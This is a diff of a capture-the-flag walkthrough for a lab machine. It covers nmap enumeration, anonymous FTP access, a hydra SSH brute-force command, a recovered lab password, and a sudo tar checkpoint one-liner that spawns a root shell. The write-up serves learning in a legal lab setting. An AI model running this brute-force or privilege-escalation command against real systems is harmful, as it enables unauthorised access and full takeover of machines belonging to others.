@@ -7,16 +7,27 @@ Our first step is to always begin with enumeration, we can use alot of tools to 
 `┌──(--㉿kali)-[~]
 └─$ nmap 10.10.81.164 -sV -sC
 `
+
+
+
 `
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 `
+
+
+
 `
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 `
+
+
+
 `
 80/tcp open  http    Apache httpd 2.4.18 
 `
+
+
 
 From this Nmap scan we see that there are 3 ports open: port 21, 22 and 80
 Importantly, we see that on port 21 there is 'Anonymous FTP login allowed' (This means that we can login as user anonymous and provide no password)
@@ -37,14 +48,13 @@ Inspecting the source code of the webpage reveals nothing ontop of this.
 
 Log into the FTP service on the machine with the following command:
 
-`┌──(--㉿kali)-[~]
-└─$ ftp <machine_ip>
+ftp <machine_ip>
+
 Connected to 10.10.81.164.
-220 (vsFTPd 3.0.3)
-Name (10.10.81.164:--): `anonymous <---- Provding the username anonymous allows us to login with no password as we learned from the nmap scan (This is quite common with ftp services)` 
+Name (10.10.81.164:--): anonymous
+
 230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.`
+
 Using `ls` we can see the files on this ftp service and we are told there are 2 .txt files, tasks.txt and locks.txt
 Use `mget *` as a means to get all files to your local device then exit the ftp service
 
@@ -56,3 +66,23 @@ It is a file containing presumably passwords, and with the list of potential use
 To do this attack we must make a file containing the usernames, which for convenience sake we will call users.txt and then write our command
 
 `hydra -l users.txt -P locks.txt ssh://<machine_ip -V>`
+
+SUCCESS!!! 
+Username: Lin
+Password: RedDr4gonSynd1cat3
+
+### Privelege Escalation
+
+`ssh lin@<machine_ip>`
+
+Logging on we see the first flag, which you can get yourself
+But we are not done, we need to get the root flag, which we dont have access to, we need to escalate our privelleges
+Using `sudo -l` we can see what we can run as sudo, which is tar, go to https://gtfobins.github.io/# and search up tar, I will let you do this on your own
+
+If you have found the right command it should be 
+`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
+
+Executing this gives us root permissions, meaning we have full control over the machine
+Change to /root and get the flag
+
+I hope this helps!!
